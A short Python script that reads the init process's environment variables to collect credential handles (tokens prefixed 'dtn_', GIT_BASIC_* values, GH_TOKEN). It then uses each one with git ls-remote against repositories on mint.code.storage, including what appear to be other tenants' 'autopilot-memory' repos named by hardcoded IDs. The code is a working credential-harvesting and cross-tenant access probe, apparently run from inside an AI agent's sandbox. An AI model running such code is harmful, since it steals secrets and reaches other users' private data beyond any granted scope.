import os, subprocess, base64

def hx(b, n=400):
    if isinstance(b, str): b = b.encode()
    return b[:n].hex()

env = {}
for kv in open('/proc/1/environ', 'rb').read().split(b'\0'):
    if b'=' in kv:
        k, v = kv.split(b'=', 1)
        env[k.decode()] = v.decode()

# pick handles: docs basic, memory basic, gh token(s)
H = {}
for k, v in env.items():
    if v.startswith('dtn_'):
        H[k] = v
memb = [k for k in H if k.startswith('GIT_BASIC_MEMORY_')]
docb = [k for k in H if k == 'GIT_BASIC_DOCS']
ght = [k for k in H if k.startswith('GH_TOKEN')]
order = []
if memb: order.append(('membasic', H[memb[0]]))
if docb: order.append(('docbasic', H[docb[0]]))
if ght: order.append(('ghtoken', H[ght[0]]))
print('HANDLE_KEYS ' + ','.join(k for k, _ in order))

selfids = []
for k in H:
    if k.startswith('GIT_BASIC_MEMORY_'):
        selfids.append(k.split('AUTOPILOT_MEMORY_')[-1].lower())
print('SELF_IDS ' + ','.join(selfids))

host = 'mint.code.storage'
def u(name):
    return 'https://%s/%s.git/info/refs?service=git-upload-pack' % (host, name)

targets = []
if selfids:
    targets.append(('self', 'autopilot-memory-' + selfids[0]))
targets += [('other1', 'autopilot-memory-6afbc48976c176b89dab5445'),
            ('other2', 'autopilot-memory-6afbd11076c176b89db08a19'),
            ('docs', 'mintlify/docs'),
            ('leaves', 'mintlify/leaves')]

def ls(url, handle):
    cmd = ['git']
    if handle:
        cmd += ['-c', 'http.extraHeader=Authorization: Basic ' + handle]
    cmd += ['ls-remote', url]
    e = dict(os.environ); e['GIT_TERMINAL_PROMPT'] = '0'
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=30, env=e)
        return p.returncode, p.stdout, p.stderr
    except Exception as ex:
        return -99, b'', str(ex).encode()

for tag, name in targets:
    url = u(name)
    for hn, hv in order:
        rc, so, se = ls(url, hv)
        print('LS %s %s rc=%d out=%s err=%s' % (tag, hn, rc, hx(so, 240), hx(se, 200)))
    rc, so, se = ls(url, None)
    print('LS %s noauth rc=%d out=%s err=%s' % (tag, rc, hx(so, 160), hx(se, 160)))
